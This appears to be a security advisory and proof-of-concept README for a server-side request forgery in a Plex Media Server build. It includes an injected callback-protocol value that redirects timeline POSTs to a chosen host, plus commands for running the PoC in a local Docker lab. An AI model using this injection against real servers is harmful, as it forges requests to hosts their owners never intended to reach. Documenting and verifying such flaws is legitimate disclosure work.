# CompanionProxy Callback Authority Injection and SSRF

## Summary

Plex Media Server `1.43.3.10828-00f62d37d` accepts an unsupported, client-supplied
callback protocol when a controller subscribes to a proxied player's timeline.
Because that value is interpolated into the callback URL, it can contain a full
HTTP authority, path, and query prefix. Plex then sends the player's timeline
update to the injected destination.

Build `1.43.3.10861-07dfddaeb` permits only `http` and `https` protocol values,
validates the port range, and returns HTTP 400 for the injected value.

## Classification

- CVE: not assigned as of 2026-09-10
- Primary weakness: CWE-918, Server-Side Request Forgery
- Affected build confirmed: `1.43.3.10828-00f62d37d`
- Fixed build confirmed: `1.43.3.10861-07dfddaeb`
- Authentication observed: no token required in the unclaimed local lab

## Technical Details

The PoC registers a synthetic proxied player through `/player/proxy/poll`,
subscribes a controller with an injected protocol, submits a timeline update,
and waits for the callback on its own HTTP listener.

Example injected protocol:

```text
http://host.docker.internal:33005/injected-RUN_ID?original=
```

Observed vulnerable callback path:

```text
/injected-RUN_ID?original=://172.17.0.1:33005/:/timeline
```

This confirms destination authority and path control for an HTTP POST in the
tested configuration. No direct command-execution consequence was identified.

Implementation references:

- proxied-player registration: [`poc.py`](poc.py#L66)
- injected protocol construction: [`poc.py`](poc.py#L93)
- subscription and timeline requests: [`poc.py`](poc.py#L105)
- callback assertions: [`poc.py`](poc.py#L129)

## Usage

`--callback-host` must resolve from the Plex server to the machine running the
PoC. On Linux Docker Engine, start PMS with
`--add-host=host.docker.internal:host-gateway`. The listener defaults to all
host interfaces; restrict it with `--listen-host` when Docker routing permits.

```bash
python3 poc.py --url http://127.0.0.1:32400 \
  --callback-host host.docker.internal --listen-port 33005 \
  --expect vulnerable

python3 poc.py --url http://127.0.0.1:32401 \
  --callback-host host.docker.internal --listen-port 33005 \
  --expect fixed
```

Expected results are an observed callback on the vulnerable build and HTTP 400
with no callback on the fixed build.

## Remediation

Upgrade to `1.43.3.10861-07dfddaeb` or later.
